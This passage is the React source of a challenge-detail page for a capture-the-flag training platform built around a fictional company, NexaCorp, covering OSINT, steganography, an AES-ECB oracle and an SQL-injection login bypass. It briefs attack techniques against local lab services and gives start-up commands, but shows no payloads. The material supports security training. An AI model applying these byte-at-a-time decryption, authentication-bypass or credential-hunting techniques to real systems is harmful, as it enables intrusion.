'use client';

import React, { useEffect, useState, useCallback, use } from 'react';
import Link from 'next/link';
import axios from 'axios';
import FlagSubmitForm from '@/components/FlagSubmitForm';
import OperativeArtwork from '@/components/OperativeArtwork';
import { STAGE_CONFIGS } from '@/lib/constants';

interface Hint {
  id: number;
  hint_level: number;
  hint_text: string;
  point_penalty: number;
}

interface ChallengeDetail {
  id: number;
  name: string;
  domain: string;
  difficulty: string;
  description: string;
  points: number;
  delivery_method: string;
  stage_number: number;
  solved?: boolean;
  locked?: boolean;
  required_stage?: number;
}

export default function ChallengeDetailPage({
  params,
}: {
  params: Promise<{ id: string }>;
}) {
  const { id } = use(params);
  const [challenge, setChallenge] = useState<ChallengeDetail | null>(null);
  const [hints, setHints] = useState<Hint[]>([]);
  const [loading, setLoading] = useState(true);
  const [isLocked, setIsLocked] = useState(false);
  const [loadError, setLoadError] = useState<string | null>(null);
  const [lockedMsg, setLockedMsg] = useState('');
  const [unlockedHints, setUnlockedHints] = useState<Set<number>>(new Set());
  const [collapsedHints, setCollapsedHints] = useState<Set<number>>(new Set());
  const [unlockMessage, setUnlockMessage] = useState<string | null>(null);
  const [stage1Tab, setStage1Tab] = useState<'portal' | 'runner' | 'intel'>('portal');
  const [stage4Tab, setStage4Tab] = useState<'start' | 'connect' | 'attack' | 'stop'>('start');
  const [stage5Tab, setStage5Tab] = useState<'start' | 'connect' | 'algo' | 'stop'>('start');
  const [stage7Tab, setStage7Tab] = useState<'start' | 'ssh' | 'privesc' | 'stop'>('start');
  const [stage8Tab, setStage8Tab] = useState<'terminal' | 'ssh' | 'kali' | 'network' | 'vm'>('terminal');
  const [copiedSnippet, setCopiedSnippet] = useState<string | null>(null);

  const copyToClipboard = (text: string, label: string) => {
    if (typeof navigator !== 'undefined' && navigator.clipboard) {
      navigator.clipboard.writeText(text);
    }
    setCopiedSnippet(label);
    setTimeout(() => setCopiedSnippet(null), 2500);
  };

  const fetchChallenge = useCallback(async () => {
    setLoadError(null);
    try {
      const res = await axios.get(`/api/challenges/${id}`);
      setChallenge(res.data.challenge);
      setHints(res.data.hints || []);
      setIsLocked(false);
    } catch (err: unknown) {
      const errorObj = err as { response?: { status?: number; data?: { locked?: boolean; error?: string; challenge?: ChallengeDetail } } };
      if (errorObj.response?.status === 403 && errorObj.response?.data?.locked) {
        setIsLocked(true);
        setLockedMsg(errorObj.response?.data?.error || 'Target perimeter is locked.');
        setChallenge(errorObj.response?.data?.challenge || null);
      } else if (errorObj.response?.status === 401) {
        setChallenge(null);
        setLoadError('Your sign-in session is missing or expired. Sign in again to load this target.');
      } else if (errorObj.response?.status === 404) {
        setChallenge(null);
      } else {
        setChallenge(null);
        setLoadError(errorObj.response?.data?.error || 'Unable to load this target. Please retry.');
      }
    } finally {
      setLoading(false);
    }
  }, [id]);

  useEffect(() => {
    fetchChallenge();
  }, [fetchChallenge]);

  useEffect(() => {
    if (typeof window !== 'undefined' && challenge?.id) {
      const saved = localStorage.getItem(`shadownet_unlocked_hints_${challenge.id}`);
      if (saved) {
        try {
          const parsed = JSON.parse(saved);
          if (Array.isArray(parsed)) {
            setUnlockedHints(new Set(parsed));
          }
        } catch (e) {
          console.error(e);
        }
      }
    }
  }, [challenge?.id]);

  const handleUnlockHint = (hintId: number, hintLevel: number, penalty: number = 40) => {
    const nextUnlocked = new Set(unlockedHints);
    nextUnlocked.add(hintId);
    setUnlockedHints(nextUnlocked);
    if (typeof window !== 'undefined' && challenge?.id) {
      localStorage.setItem(`shadownet_unlocked_hints_${challenge.id}`, JSON.stringify(Array.from(nextUnlocked)));
    }
    setUnlockMessage(`Tactical Hint ${hintLevel} decrypted. ${penalty} XP penalty registered.`);
    setTimeout(() => {
      setUnlockMessage(null);
    }, 4000);
  };

  const toggleCollapse = (hintId: number) => {
    setCollapsedHints((prev) => {
      const next = new Set(prev);
      if (next.has(hintId)) next.delete(hintId);
      else next.add(hintId);
      return next;
    });
  };

  if (loading) {
    return (
      <div className="text-center py-20 font-mono text-xs text-[#8B949E]">
        <span className="inline-block animate-spin mr-2 text-[#FF6B00]">⚙️</span>
        Synchronizing with NexaCorp target host...
      </div>
    );
  }

  // Locked Screen State
  if (isLocked) {
    return (
      <div className="max-w-xl mx-auto my-8 cyber-panel rounded-xl p-6 sm:p-8 text-center space-y-5 bg-[#0E1217]">
        <div className="w-14 h-14 rounded-xl bg-[#141920] border border-[#EF4444]/40 flex items-center justify-center text-2xl mx-auto text-[#EF4444] shadow-[0_0_16px_rgba(239,68,68,0.2)]">
          🔒
        </div>

        <div className="space-y-1.5">
          <span className="text-[10px] font-bold text-[#EF4444] bg-[#EF4444]/15 px-2.5 py-0.5 rounded-full border border-[#EF4444]/35 inline-block font-mono">
            DEFENSE PERIMETER LOCKED
          </span>
          <h2 className="text-xl sm:text-2xl font-bold font-sans text-[#F5F5F5]">
            Stage 0{challenge?.stage_number || id} Access Restricted
          </h2>
          <p className="text-xs text-[#8B949E] max-w-sm mx-auto leading-relaxed font-sans">
            {lockedMsg || 'Breach the preceding NexaCorp defense layer to unlock this target system.'}
          </p>
        </div>

        <div className="flex flex-col sm:flex-row items-center justify-center gap-2.5 pt-2">
          <Link href="/dashboard/challenges" className="btn-primary w-full sm:w-auto h-10 px-5 text-xs font-bold">
            Target Deck
          </Link>
          <Link href="/dashboard/progress" className="btn-secondary w-full sm:w-auto h-10 px-5 text-xs font-bold">
            Killchain Map
          </Link>
        </div>
      </div>
    );
  }

  if (loadError) {
    return (
      <div role="alert" className="max-w-md mx-auto my-12 bg-[#0E1217] border border-[#EF4444]/30 rounded-xl p-6 text-center font-mono space-y-4">
        <h2 className="text-lg font-bold text-[#EF4444] font-sans">Target Could Not Be Loaded</h2>
        <p className="text-xs text-[#8B949E]">{loadError}</p>
        <div className="flex items-center justify-center gap-3">
          <button
            type="button"
            onClick={() => {
              setLoading(true);
              fetchChallenge();
            }}
            className="btn-primary text-xs py-2 px-4"
          >
            Retry
          </button>
          <Link href={loadError.startsWith('Your sign-in') ? '/auth/login' : '/dashboard/challenges'} className="btn-secondary text-xs py-2 px-4">
            {loadError.startsWith('Your sign-in') ? 'SIGN IN' : 'TARGET DECK'}
          </Link>
        </div>
      </div>
    );
  }

  if (!challenge) {
    return (
      <div className="max-w-md mx-auto my-12 bg-[#0E1217] border border-[#232B36] rounded-xl p-6 text-center font-mono space-y-4">
        <h2 className="text-lg font-bold text-[#EF4444] font-sans">404 - Target Host Not Found</h2>
        <p className="text-xs text-[#8B949E]">The requested NexaCorp subsystem does not exist or has been decommissioned.</p>
        <Link href="/dashboard/challenges" className="btn-primary text-xs py-2 px-4">
          RETURN TO TARGET DECK
        </Link>
      </div>
    );
  }

  const stageConfig = STAGE_CONFIGS[challenge.stage_number];

  return (
    <div className="w-full space-y-6">
      {/* Top Nav Breadcrumbs */}
      <div className="flex items-center gap-2 font-mono text-xs text-[#8B949E]">
        <Link href="/dashboard/challenges" className="text-[#FF9F43] hover:text-[#FF8533] transition-colors">
          Target Deck
        </Link>
        <span className="text-[#232B36]">/</span>
        <span className="text-[#F5F5F5] font-semibold">
          STAGE 0{challenge.stage_number} {'//'} {stageConfig?.subsystemCode || `TARGET-0${challenge.stage_number}`}
        </span>
      </div>

      {/* Challenge Hero Header */}
      <div className="bg-[#0E1217] border border-[#232B36] rounded-xl p-5 sm:p-7 relative overflow-hidden shadow-[0_4px_24px_rgba(0,0,0,0.35)]">
        <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-[#9FEF00] via-[#9FEF00] to-[#9FEF00]"></div>

        <div className="relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-4 sm:gap-6">
          <div className="space-y-2">
            <div className="flex flex-wrap items-center gap-2">
              <span className="font-mono text-[11px] font-bold px-2 py-0.5 rounded bg-[#141920] text-[#FF8533] border border-[#232B36]">
                Stage 0{challenge.stage_number}
              </span>
              <span className="font-mono text-[11px] font-semibold px-2 py-0.5 rounded bg-[#FF9F43]/15 text-[#FF9F43] border border-[#FF9F43]/30">
                {challenge.difficulty}
              </span>
              <span className="font-mono text-[11px] text-[#8B949E]">
                VECTOR: <strong className="text-[#F5F5F5]">{challenge.domain}</strong>
              </span>
              {stageConfig?.subsystemCode && (
                <span className="font-mono text-[11px] text-[#10B981] bg-[#10B981]/10 px-2 py-0.5 rounded border border-[#10B981]/30">
                  {stageConfig.subsystemCode}
                </span>
              )}
            </div>

            <h1 className="text-2xl sm:text-3xl font-black text-[#F5F5F5] font-sans tracking-tight">
              {challenge.name}
            </h1>
          </div>

          <div className="flex md:flex-col items-end justify-between md:justify-center gap-1.5 bg-[#141920] border border-[#232B36] rounded-lg p-3.5 sm:p-4 min-w-[150px] flex-shrink-0">
            <span className="text-xs font-mono text-[#8B949E]">Bounty</span>
            <span className="font-mono text-xl sm:text-2xl font-black text-[#FF6B00]">
              +{challenge.points} <span className="text-xs font-bold text-[#FF9F43]">XP</span>
            </span>
            {challenge.solved && (
              <span className="font-mono text-xs font-bold text-[#10B981] flex items-center gap-1">
                <span>●</span> Breached
              </span>
            )}
          </div>
        </div>
      </div>

      <section className="operative-guide px-1 sm:px-3" aria-label="Field operative briefing">
        <div className="operative-dialogue">
          <div className="mb-2 flex flex-wrap items-center gap-2 font-mono text-[10px] font-bold uppercase">
            <span className="text-[#9FEF00]">SHADE // FIELD NOTE</span>
            <span className="text-[#6B7894]">{stageConfig?.subsystemCode || `STAGE-0${challenge.stage_number}`}</span>
          </div>
          <h2 className="mb-1 text-sm sm:text-base font-bold text-white">{challenge.name}</h2>
          <p className="text-xs sm:text-sm leading-relaxed text-[#A4B1CD]">
            NexaCorp is counting on you to rush this {challenge.domain.toLowerCase()} operation. Stay methodical, follow the evidence, and trust your instincts. Every clue brings you closer to the breach.
          </p>
        </div>
      </section>

      {/* 2-Column Main Layout */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left Column: Briefing, Environment, & Flag Submission */}
        <div className="lg:col-span-2 space-y-6">
          {/* Mission Briefing */}
          <div className="cyber-panel p-5 sm:p-6 bg-[#0E1217]">
            <div className="flex items-center justify-between mb-3 border-b border-[#232B36] pb-2.5">
              <h3 className="font-sans text-base font-bold text-[#F5F5F5] flex items-center gap-2">
                <span className="text-[#FF6B00]">◈</span> Operative Mission Brief
              </h3>
              <span className="font-mono text-[10px] text-[#8B949E]">
                TARGET: {stageConfig?.targetSystem || 'NexaCorp Subsystem'}
              </span>
            </div>
            <p className="text-xs sm:text-sm text-[#E2E8F0] leading-relaxed font-sans mb-3">
              {challenge.description}
            </p>
            {stageConfig?.storyBrief && stageConfig.storyBrief !== challenge.description && (
              <div className="p-3 bg-[#080A0D] border border-[#232B36] rounded-lg text-xs text-[#8B949E] font-sans leading-relaxed">
                <strong className="text-[#FF8533] block mb-0.5 font-mono text-[11px]">NARRATIVE INTEL:</strong>
                {stageConfig.storyBrief}
              </div>
            )}
          </div>

          {/* Connection / Environment Information */}
          <div className="cyber-panel p-5 sm:p-6 bg-[#0E1217]">
            <h3 className="font-sans text-base font-bold text-[#F5F5F5] mb-3.5 flex items-center gap-2">
              <span className="text-[#FF9F43]">⚡</span> Target Infiltration Access
            </h3>

            <div className="space-y-3 font-mono text-xs">
              <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-lg">
                <span className="text-[10px] text-[#8B949E] block mb-0.5 uppercase">Environment Delivery</span>
                <span className="text-[#FF8533] font-bold text-xs">
                  {challenge.delivery_method}
                </span>
              </div>

              {stageConfig && (
                <>
                  <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-lg">
                    <span className="text-[10px] text-[#8B949E] block mb-0.5 uppercase">Access Protocol</span>
                    <span className="text-[#F5F5F5] text-xs leading-relaxed font-sans">{stageConfig.accessGuide}</span>
                  </div>

                  <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-lg">
                    <span className="text-[10px] text-[#8B949E] block mb-1 uppercase">Tactical Verification Status</span>
                    <span className="text-[#10B981] font-bold text-xs bg-[#141920] px-2.5 py-1 rounded border border-[#232B36] inline-block font-mono">
                      {stageConfig.statusCheck}
                    </span>
                  </div>
                </>
              )}
            </div>

            <div className="challenge-operative-dock" aria-hidden="true">
              <OperativeArtwork
                sizes="(max-width: 640px) 96px, 144px"
                className="challenge-figure h-auto w-full object-contain"
              />
            </div>
          </div>

          {/* Stage 1: NexaCorp Reconnaissance (OSINT) */}
          {challenge.stage_number === 1 && (
            <div className="cyber-panel p-5 sm:p-6 space-y-5 bg-[#0E1217] border border-[#242C37]">
              {/* Header & Quick Action Launcher */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#232B36] pb-4">
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-[#FF6B00]/20 text-[#FF8533] border border-[#FF6B00]/40 uppercase tracking-wider">
                      Perimeter OSINT Reconnaissance
                    </span>
                    <span className="text-[10px] font-mono text-[#10B981] bg-[#10B981]/15 px-2 py-0.5 rounded border border-[#10B981]/30">
                      Zero RAM Overhead / Static Ready
                    </span>
                  </div>
                  <h3 className="font-sans text-lg font-bold text-[#F5F5F5] flex items-center gap-2">
                    <span className="text-[#FF6B00]">🌐</span> NexaCorp Public Reconnaissance Portal
                  </h3>
                  <p className="text-xs text-[#8B949E] font-sans mt-0.5">
                    Target organization perimeter website. Inspect source comments, staff metadata, and leaked files.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2 flex-shrink-0">
                  <a
                    href="/stages/stage1-osint/index.html"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="btn-primary text-xs font-mono font-bold px-4 py-2 flex items-center gap-1.5 shadow-[0_0_14px_rgba(255,107,0,0.25)]"
                  >
                    🌐 OPEN WEB PORTAL
                  </a>
                </div>
              </div>

              {/* Navigation Tabs */}
              <div className="flex flex-wrap gap-1.5 border-b border-[#232B36] pb-2 text-xs font-mono">
                <button
                  type="button"
                  onClick={() => setStage1Tab('portal')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage1Tab === 'portal'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🏢 Portal Sections
                </button>
                <button
                  type="button"
                  onClick={() => setStage1Tab('runner')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage1Tab === 'runner'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  ⚙️ Standalone Local Server
                </button>
                <button
                  type="button"
                  onClick={() => setStage1Tab('intel')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage1Tab === 'intel'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🔍 Recon Intel Clues
                </button>
              </div>

              {/* Tab 1: Portal Sections */}
              {stage1Tab === 'portal' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                    <a
                      href="/stages/stage1-osint/index.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="p-3.5 bg-[#080A0D] hover:bg-[#141920] border border-[#232B36] hover:border-[#FF9F43]/40 rounded-xl transition-all block group"
                    >
                      <div className="flex items-center justify-between">
                        <span className="text-[#F5F5F5] font-bold group-hover:text-[#FF9F43] transition-colors">🏢 Company Overview</span>
                        <span className="text-[10px] text-[#10B981]">ONLINE ↗</span>
                      </div>
                      <div className="text-[11px] text-[#8B949E] mt-1 font-sans">Landing page, corporate mission &amp; public newsfeed</div>
                    </a>
                    <a
                      href="/stages/stage1-osint/staff-directory.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="p-3.5 bg-[#080A0D] hover:bg-[#141920] border border-[#232B36] hover:border-[#FF9F43]/40 rounded-xl transition-all block group"
                    >
                      <div className="flex items-center justify-between">
                        <span className="text-[#FF9F43] font-bold">👥 Staff Directory</span>
                        <span className="text-[10px] text-[#10B981]">ONLINE ↗</span>
                      </div>
                      <div className="text-[11px] text-[#8B949E] mt-1 font-sans">16 Employee dossiers, emails, titles &amp; profile pictures</div>
                    </a>
                    <a
                      href="/stages/stage1-osint/updates.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="p-3.5 bg-[#080A0D] hover:bg-[#141920] border border-[#232B36] hover:border-[#FF9F43]/40 rounded-xl transition-all block group"
                    >
                      <div className="flex items-center justify-between">
                        <span className="text-[#10B981] font-bold">📰 Press Updates</span>
                        <span className="text-[10px] text-[#10B981]">ONLINE ↗</span>
                      </div>
                      <div className="text-[11px] text-[#8B949E] mt-1 font-sans">Security bulletins, research statements &amp; leak breadcrumbs</div>
                    </a>
                  </div>
                </div>
              )}

              {/* Tab 2: Standalone Local Runner */}
              {stage1Tab === 'runner' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="font-bold text-[#F5F5F5] text-sm block">
                      ⚙️ Run Stage 1 as Standalone HTTP Server (Port 8081)
                    </span>
                    <p className="text-[#8B949E] text-xs font-sans leading-relaxed">
                      If you prefer serving the OSINT pages outside Next.js on an isolated port, you can spawn a lightweight Python HTTP server on port 8081:
                    </p>
                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Start Standalone Python Server</strong>
                        <code className="text-[#10B981] text-[11px]">python3 -m http.server 8081 --directory public/stages/stage1-osint</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('python3 -m http.server 8081 --directory public/stages/stage1-osint', 's1_start')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's1_start' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Stop Standalone Server (Free Port 8081)</strong>
                        <code className="text-[#EF4444] text-[11px]">pkill -f &quot;http.server 8081&quot;</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('pkill -f "http.server 8081"', 's1_stop')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#EF4444] px-3 py-1.5 rounded border border-[#EF4444]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's1_stop' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 3: Recon Intel Clues */}
              {stage1Tab === 'intel' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-2">
                    <span className="text-[#FF8533] block text-xs font-bold">RECONNAISSANCE TACTICS:</span>
                    <ul className="list-disc list-inside space-y-1 text-[#8B949E] text-xs font-sans leading-relaxed">
                      <li>Inspect the raw HTML source code of each page using browser DevTools (Ctrl+Shift+I / Cmd+Option+I).</li>
                      <li>Review developer comments and metadata tags on <code className="text-[#FF9F43] font-mono">staff-directory.html</code> and <code className="text-[#FF9F43] font-mono">updates.html</code>.</li>
                      <li>Look for exposed archive hashes or test credentials placed in public dossiers.</li>
                    </ul>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Stage 2: Covert Transmissions (Steganography) */}
          {challenge.stage_number === 2 && (
            <div className="cyber-panel p-5 sm:p-6 space-y-4 bg-[#0E1217]">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#232B36] pb-3">
                <div>
                  <h3 className="font-sans text-base font-bold text-[#F5F5F5] flex items-center gap-2">
                    <span className="text-[#FF6B00]">📦</span> Intercepted Transmission Package
                  </h3>
                  <p className="text-xs text-[#8B949E] font-sans mt-0.5">
                    Package includes 27 intercepted audio frequencies (1 authentic + 26 decoy channels) and photographic exhibits.
                  </p>
                </div>
                <a
                  href="/downloads/stage2/stage2-covert-transmissions.zip"
                  download="stage2-covert-transmissions.zip"
                  className="btn-primary text-xs font-mono font-bold px-4 py-2.5 flex items-center gap-2 text-center justify-center flex-shrink-0"
                >
                  ⚡ DOWNLOAD PACKAGE (.ZIP)
                </a>
              </div>

              {/* Package Details Cards */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 font-mono text-xs">
                <div className="p-3 bg-[#080A0D] border border-[#232B36] rounded-lg">
                  <div className="text-[#F5F5F5] font-bold">📷 whistleblower.jpg</div>
                  <div className="text-[10px] text-[#8B949E] mt-1">Classified Drone Photo Exhibit (Contains embedded intel)</div>
                </div>

                <div className="p-3 bg-[#080A0D] border border-[#232B36] rounded-lg">
                  <div className="text-[#FF9F43] font-bold">🔊 27 Audio Transmissions</div>
                  <div className="text-[10px] text-[#8B949E] mt-1">1 Authentic Carrier + 26 Jamming Decoy Channels (.wav)</div>
                </div>
              </div>

              {/* Covert Extraction Protocol Brief */}
              <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-lg text-xs font-mono space-y-1">
                <span className="text-[#FF8533] block text-[11px] font-semibold">COVERT EXTRACTION PROTOCOL:</span>
                <p className="text-[#8B949E] text-[11px] font-sans leading-relaxed">
                  The intercepted package contains classified drone photography with encrypted intelligence payloads, alongside multi-frequency audio recordings. Analyze spectrogram signals and decode photographic assets using recovered operative passphrases (e.g. &apos;shelter&apos;).
                </p>
              </div>
            </div>
          )}

          {/* Stage 3: Cipher Oracle (Cryptography) */}
          {challenge.stage_number === 3 && (
            <div className="cyber-panel p-5 sm:p-6 space-y-4 bg-[#0E1217]">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#232B36] pb-3">
                <div>
                  <h3 className="font-sans text-base font-bold text-[#F5F5F5] flex items-center gap-2">
                    <span className="text-[#FF6B00]">🔐</span> Cryptographic Oracle Uplink
                  </h3>
                  <p className="text-xs text-[#8B949E] font-sans mt-0.5">
                    Hardware Security Module running AES-ECB encryption oracle on raw TCP socket port 5000.
                  </p>
                </div>
                <div className="px-3 py-1.5 bg-[#141920] border border-[#10B981]/40 rounded text-xs font-mono text-[#10B981] font-bold">
                  TCP PORT 5000
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 font-mono text-xs">
                <div className="p-3 bg-[#080A0D] border border-[#232B36] rounded-lg">
                  <span className="text-[10px] text-[#8B949E] block mb-1">INTERACTIVE TCP CONNECTION</span>
                  <code className="text-[#10B981] font-bold select-all block">nc localhost 5000</code>
                </div>
                <div className="p-3 bg-[#080A0D] border border-[#232B36] rounded-lg">
                  <span className="text-[10px] text-[#8B949E] block mb-1">DOCKER SERVICE NAME</span>
                  <code className="text-[#FF9F43] font-bold block">stage3-crypto (Port 5000:5000)</code>
                </div>
              </div>

              <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-lg text-xs font-mono space-y-1">
                <span className="text-[#FF8533] block text-[11px] font-semibold">ATTACK VECTOR BRIEF:</span>
                <p className="text-[#8B949E] text-[11px] font-sans leading-relaxed">
                  The oracle appends a secret key to your plaintext and encrypts with AES in ECB mode. Exploit differential block boundary alignment to recover the secret master key one byte at a time.
                </p>
              </div>
            </div>
          )}

          {/* Stage 4: NexaAuth Portal Bypass (Web Security) */}
          {challenge.stage_number === 4 && (
            <div className="cyber-panel p-5 sm:p-6 space-y-5 bg-[#0E1217] border border-[#242C37]">
              {/* Header & Quick Action Launchers */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#232B36] pb-4">
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-[#FF6B00]/20 text-[#FF8533] border border-[#FF6B00]/40 uppercase tracking-wider">
                      Web Application Security
                    </span>
                    <span className="text-[10px] font-mono text-[#10B981] bg-[#10B981]/15 px-2 py-0.5 rounded border border-[#10B981]/30">
                      Port 8084 • SQL Injection
                    </span>
                  </div>
                  <h3 className="font-sans text-lg font-bold text-[#F5F5F5] flex items-center gap-2">
                    <span className="text-[#FF6B00]">🛡️</span> NexaAuth SSO Portal Gateway
                  </h3>
                  <p className="text-xs text-[#8B949E] font-sans mt-0.5">
                    Central Employee Single Sign-On and admin dashboard. Bypass authentication using SQL injection.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2 flex-shrink-0">
                  <a
                    href="http://localhost:8084"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="btn-primary text-xs font-mono font-bold px-3.5 py-2 flex items-center gap-1.5 shadow-[0_0_14px_rgba(255,107,0,0.25)]"
                  >
                    🌐 LAUNCH PORTAL (8084)
                  </a>
                </div>
              </div>

              {/* Navigation Tabs */}
              <div className="flex flex-wrap gap-1.5 border-b border-[#232B36] pb-2 text-xs font-mono">
                <button
                  type="button"
                  onClick={() => setStage4Tab('start')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage4Tab === 'start'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🚀 How to Start
                </button>
                <button
                  type="button"
                  onClick={() => setStage4Tab('connect')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage4Tab === 'connect'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🌐 Connect &amp; Endpoints
                </button>
                <button
                  type="button"
                  onClick={() => setStage4Tab('attack')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage4Tab === 'attack'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  💉 SQLi Attack Vector
                </button>
                <button
                  type="button"
                  onClick={() => setStage4Tab('stop')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage4Tab === 'stop'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  ⏹️ Stop (Save RAM)
                </button>
              </div>

              {/* Tab 1: How to Start */}
              {stage4Tab === 'start' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="font-bold text-[#F5F5F5] text-sm block">
                      🚀 Start Stage 4 Target Service (Choose One Method)
                    </span>
                    <p className="text-[#8B949E] text-xs font-sans leading-relaxed">
                      Only run this service when actively solving Stage 4. You can start it either with Docker Compose or as a native Python Flask server:
                    </p>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Option A: Docker Compose (Isolated)</strong>
                        <code className="text-[#10B981] text-[11px]">docker compose -f stages/stage4-web/docker-compose.yml up -d</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('docker compose -f stages/stage4-web/docker-compose.yml up -d', 's4_docker_start')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's4_docker_start' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Option B: Native Python (Low RAM)</strong>
                        <code className="text-[#10B981] text-[11px]">python3 stages/stage4-web/app.py</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('python3 stages/stage4-web/app.py', 's4_py_start')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's4_py_start' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Verify Service Status</strong>
                        <code className="text-[#8B949E] text-[11px]">curl -I http://localhost:8084/login</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('curl -I http://localhost:8084/login', 's4_test')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#10B981] px-3 py-1.5 rounded border border-[#10B981]/40 cursor-pointer font-bold flex-shrink-0"
                      >
